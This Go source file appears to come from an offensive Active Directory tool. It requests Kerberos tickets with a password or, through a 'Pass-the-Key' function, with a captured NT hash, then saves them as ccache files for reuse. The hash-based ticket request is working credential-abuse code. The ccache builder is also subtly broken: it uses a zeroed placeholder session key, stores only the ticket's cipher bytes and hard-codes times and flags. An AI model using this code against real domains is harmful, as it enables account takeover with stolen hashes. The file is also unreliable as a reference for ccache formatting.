// pkg/kerberos/tickets.go
package kerberos

import (
	"encoding/binary"
	"fmt"
	"os"
	"time"

	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/keytab"
)

// TGTResult résultat d'une demande de TGT
type TGTResult struct {
	Username   string
	Domain     string
	OutputFile string
	ExpiresAt  time.Time
	EncType    uint16
}

// ============================================================
// GetTGT — demande un TGT avec mot de passe
// ============================================================

func GetTGT(username, domain, password, dcHost, outputFile string) (*TGTResult, error) {
	fmt.Printf("[*] Requesting TGT for %s@%s...\n", username, domain)

	cfg, err := config.NewFromString(buildKrb5Config(domain, dcHost))
	if err != nil {
		return nil, fmt.Errorf("kerberos config error: %v", err)
	}

	cl := client.NewWithPassword(username, domain, password, cfg,
		client.DisablePAFXFAST(true))

	if err := cl.Login(); err != nil {
		return nil, fmt.Errorf("TGT request failed: %v", err)
	}

	// GetServiceTicket retourne (messages.Ticket, types.EncryptionKey, error)
	// tkt EST le ticket directement — pas de champ .Ticket
	tkt, _, err := cl.GetServiceTicket("krbtgt/" + domain)
	if err != nil {
		return nil, fmt.Errorf("TGT retrieval failed: %v", err)
	}

	if outputFile == "" {
		outputFile = fmt.Sprintf("%s_%s.ccache", username, domain)
	}

	// tkt.EncPart.EType — accès direct sur messages.Ticket
	encType := uint16(tkt.EncPart.EType)
	ccache, err := buildCCacheFile(username, domain, tkt.EncPart.Cipher, encType)
	if err != nil {
		return nil, fmt.Errorf("ccache build failed: %v", err)
	}

	if err := os.WriteFile(outputFile, ccache, 0600); err != nil {
		return nil, fmt.Errorf("ccache write failed: %v", err)
	}

	// L'expiry n'est pas déchiffrable côté client (chiffré avec la clé du service)
	// On utilise le standard AD : TGT valide 10h
	expiry := time.Now().Add(10 * time.Hour)

	fmt.Printf("[+] TGT obtained — expires: %s\n", expiry.Format("2006-01-02 15:04:05"))
	fmt.Printf("[+] Saved: %s\n", outputFile)
	fmt.Printf("[*] Usage: export KRB5CCNAME=%s\n", outputFile)

	return &TGTResult{
		Username:   username,
		Domain:     domain,
		OutputFile: outputFile,
		ExpiresAt:  expiry,
		EncType:    encType,
	}, nil
}

// GetTGTWithHash — Pass-the-Key (NT hash au lieu du mot de passe)
func GetTGTWithHash(username, domain, ntHash, dcHost, outputFile string) (*TGTResult, error) {
	fmt.Printf("[*] Requesting TGT (Pass-the-Key) for %s@%s...\n", username, domain)

	cfg, err := config.NewFromString(buildKrb5Config(domain, dcHost))
	if err != nil {
		return nil, fmt.Errorf("kerberos config error: %v", err)
	}

	// Pass-the-Key via keytab avec RC4-HMAC (enctype 23)
	// On construit un keytab minimal avec le NT hash
	kt := keytab.New()
	if err := kt.AddEntry(username, domain, ntHash, time.Now(), 1, 23); err != nil {
		return nil, fmt.Errorf("keytab creation failed: %v", err)
	}

	cl := client.NewWithKeytab(username, domain, kt, cfg,
		client.DisablePAFXFAST(true))

	if err := cl.Login(); err != nil {
		return nil, fmt.Errorf("Pass-the-Key failed: %v", err)
	}

	tkt, _, err := cl.GetServiceTicket("krbtgt/" + domain)
	if err != nil {
		return nil, fmt.Errorf("TGT retrieval failed: %v", err)
	}

	if outputFile == "" {
		outputFile = fmt.Sprintf("%s_%s.ccache", username, domain)
	}

	encType := uint16(tkt.EncPart.EType)
	ccache, err := buildCCacheFile(username, domain, tkt.EncPart.Cipher, encType)
	if err != nil {
		return nil, fmt.Errorf("ccache build failed: %v", err)
	}

	if err := os.WriteFile(outputFile, ccache, 0600); err != nil {
		return nil, fmt.Errorf("ccache write failed: %v", err)
	}

	expiry := time.Now().Add(10 * time.Hour)
	fmt.Printf("[+] TGT obtained via Pass-the-Key\n")
	fmt.Printf("[+] Saved: %s\n", outputFile)

	return &TGTResult{
		Username:   username,
		Domain:     domain,
		OutputFile: outputFile,
		ExpiresAt:  expiry,
		EncType:    encType,
	}, nil
}

// EnumerateTickets — fonction existante conservée
func EnumerateTickets(username, password, domain, kdc string) error {
	cfg, err := config.Load("/etc/krb5.conf")
	if err != nil {
		return fmt.Errorf("failed to load Kerberos config: %v", err)
	}

	cl := client.NewWithPassword(username, domain, password, cfg)
	if err := cl.Login(); err != nil {
		return fmt.Errorf("failed to login: %v", err)
	}

	fmt.Printf("Successfully authenticated with Kerberos for user: %s\n", username)
	return nil
}

// ============================================================
// Format ccache MIT v4
// Spec : https://web.mit.edu/kerberos/krb5-latest/doc/formats/ccache_file_format.html
// ============================================================

// buildCCacheFile construit un fichier .ccache MIT v4 complet
func buildCCacheFile(username, realm string, ticketBytes []byte, encType uint16) ([]byte, error) {
	var buf []byte
	buf = append(buf, buildCCacheHeader()...)
	buf = append(buf, encodePrincipal(username, realm)...)
	cred, err := buildCredential(username, realm, ticketBytes, encType)
	if err != nil {
		return nil, err
	}
	buf = append(buf, cred...)
	return buf, nil
}

// buildCCacheHeader construit le header MIT ccache v4
// Format : file_format_version(2) + header_len(2) + header_tags
func buildCCacheHeader() []byte {
	// file_format_version = 0x0504
	header := []byte{0x05, 0x04}

	// Tag time_offset (0x0001) — 8 bytes de payload
	timeOffsetTag := []byte{
		0x00, 0x01, // tag = 1
		0x00, 0x08, // len = 8
		0x00, 0x00, 0x00, 0x00, // seconds offset
		0x00, 0x00, 0x00, 0x00, // microseconds offset
	}

	headerLen := make([]byte, 2)
	binary.BigEndian.PutUint16(headerLen, uint16(len(timeOffsetTag)))
	header = append(header, headerLen...)
	header = append(header, timeOffsetTag...)
	return header
}

// encodePrincipal encode un principal ccache
// Format : name_type(4) + num_components(4) + realm + components[]
func encodePrincipal(username, realm string) []byte {
	var buf []byte

	nameType := make([]byte, 4)
	binary.BigEndian.PutUint32(nameType, 1) // NT_PRINCIPAL
	buf = append(buf, nameType...)

	numComp := make([]byte, 4)
	binary.BigEndian.PutUint32(numComp, 1)
	buf = append(buf, numComp...)

	buf = append(buf, countedOctetString(realm)...)
	buf = append(buf, countedOctetString(username)...)
	return buf
}

// encodeTimestamp encode un time.Time en uint32 big-endian (secondes Unix)
func encodeTimestamp(t time.Time) []byte {
	b := make([]byte, 4)
	if !t.IsZero() {
		binary.BigEndian.PutUint32(b, uint32(t.Unix()))
	}
	return b
}

// buildKeyblock construit un keyblock ccache
// Format : keytype(2) + keylen(2) + keydata
func buildKeyblock(encType uint16, key []byte) []byte {
	var buf []byte

	kt := make([]byte, 2)
	binary.BigEndian.PutUint16(kt, encType)
	buf = append(buf, kt...)

	kl := make([]byte, 2)
	binary.BigEndian.PutUint16(kl, uint16(len(key)))
	buf = append(buf, kl...)

	buf = append(buf, key...)
	return buf
}

// buildCredential construit une credential ccache (le TGT)
func buildCredential(username, realm string, ticketBytes []byte, encType uint16) ([]byte, error) {
	var buf []byte
	now := time.Now()

	buf = append(buf, encodePrincipal(username, realm)...)
	buf = append(buf, encodePrincipal("krbtgt", realm)...)

	sessionKey := make([]byte, 16) // placeholder
	buf = append(buf, buildKeyblock(encType, sessionKey)...)

	buf = append(buf, encodeTimestamp(now)...)
	buf = append(buf, encodeTimestamp(now)...)
	buf = append(buf, encodeTimestamp(now.Add(10*time.Hour))...)
	buf = append(buf, encodeTimestamp(time.Time{})...)

	buf = append(buf, 0x00) // is_skey

	flags := make([]byte, 4)
	binary.BigEndian.PutUint32(flags, 0x50a00000)
	buf = append(buf, flags...)

	buf = append(buf, 0x00, 0x00, 0x00, 0x00) // addresses count
	buf = append(buf, 0x00, 0x00, 0x00, 0x00) // authdata count

	ticketLen := make([]byte, 4)
	binary.BigEndian.PutUint32(ticketLen, uint32(len(ticketBytes)))
	buf = append(buf, ticketLen...)
	buf = append(buf, ticketBytes...)

	buf = append(buf, 0x00, 0x00, 0x00, 0x00) // second_ticket length

	return buf, nil
}

// countedOctetString encode une string en : uint32(len) + bytes
func countedOctetString(s string) []byte {
	b := []byte(s)
	length := make([]byte, 4)
	binary.BigEndian.PutUint32(length, uint32(len(b)))
	return append(length, b...)
}

// ============================================================
// Helper : config krb5 minimale
// ============================================================

func buildKrb5Config(realm, kdc string) string {
	lower := realmToLower(realm)
	return fmt.Sprintf(`[libdefaults]
    default_realm = %s
    dns_lookup_realm = false
    dns_lookup_kdc = false
    forwardable = true
    rdns = false

[realms]
    %s = {
        kdc = %s
        admin_server = %s
    }

[domain_realm]
    .%s = %s
    %s = %s
`, realm, realm, kdc, kdc, lower, realm, lower, realm)
}

func realmToLower(s string) string {
	b := []byte(s)
	for i, c := range b {
		if c >= 'A' && c <= 'Z' {
			b[i] = c + 32
		}
	}
	return string(b)
}
